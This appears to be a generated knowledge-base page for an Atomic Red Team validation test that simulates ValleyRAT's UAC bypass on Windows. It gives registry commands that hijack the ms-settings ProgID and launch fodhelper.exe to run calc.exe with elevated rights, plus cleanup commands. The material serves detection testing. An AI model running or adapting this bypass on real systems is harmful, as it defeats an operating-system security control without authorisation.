---
atomic_guid: "b6f4645c-34ea-4c7c-98f2-d5a2747efb08"
title: "UAC bypassed by Utilizing ProgIDs registry."
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "b6f4645c-34ea-4c7c-98f2-d5a2747efb08"
  - "UAC bypassed by Utilizing ProgIDs registry."
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# UAC bypassed by Utilizing ProgIDs registry.

This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.

## Metadata

- Atomic GUID: b6f4645c-34ea-4c7c-98f2-d5a2747efb08
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Executor

- name: command_prompt

### Command

```commandprompt
reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f

reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /d ".pwn" /f

echo Triggering fodhelper.exe for potential privilege escalation...
start fodhelper.exe
```

### Cleanup

```commandprompt
reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
